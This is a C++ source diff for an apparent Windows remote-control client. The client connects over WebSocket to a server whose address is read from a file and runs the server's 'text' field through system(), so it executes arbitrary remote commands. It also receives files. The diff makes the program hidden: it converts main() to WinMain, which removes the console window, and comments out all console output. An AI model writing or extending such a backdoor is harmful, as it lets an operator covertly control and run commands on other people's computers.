@@ -41,9 +41,19 @@ string getExePath(){
 }
 
 
+void ErrorNotiffication(const char* message){
+    char buffer[255];
+    MessageBoxA(NULL,message, "IN FILE EYE" ,MB_ICONERROR | MB_OK);
+}
 
 
-int main(){
+
+
+
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
+{
     string BASE_URL;
 
 
@@ -52,13 +62,11 @@ int main(){
         getline(file,BASE_URL);
 
     }else{
-        cout << "Not open config.txt" << endl;
+        ErrorNotiffication("Not open host.txt");
         return 1;
     }
 
     file.close();
-    
-    cout << BASE_URL << endl;
 
     ix::initNetSystem();
     ix::WebSocket webSocket;
@@ -70,7 +78,7 @@ int main(){
     webSocket.setOnMessageCallback([&](const ix::WebSocketMessagePtr& msg) {
         if(msg->type == ix::WebSocketMessageType::Message){
             if(!isConnect){
-                cout << "from server: " << msg->str << endl;
+                // cout << "from server: " << msg->str << endl;
                 isConnect = true;
             }else{
                 json data = json::parse(msg->str);
@@ -80,7 +88,7 @@ int main(){
                     string text = data["text"];
                     system(text.c_str());
 // "type": "file"
-// "text": "start https://"
+// "text": "start https://..."
                     }
                 if(type == "file"){
                     string filename = data["filename"];
@@ -103,11 +111,11 @@ int main(){
 
     while(true){
         if(isConnect){
-          cout << '.';
+        //   cout << '.';
         }else{
           webSocket.send(send_data.dump());  
         //   cout << send_data["key"] << endl;
-          cout << send_data["name"] << endl;
+        //   cout << send_data["name"] << endl;
         }
         this_thread::sleep_for(std::chrono::seconds(1));
     }
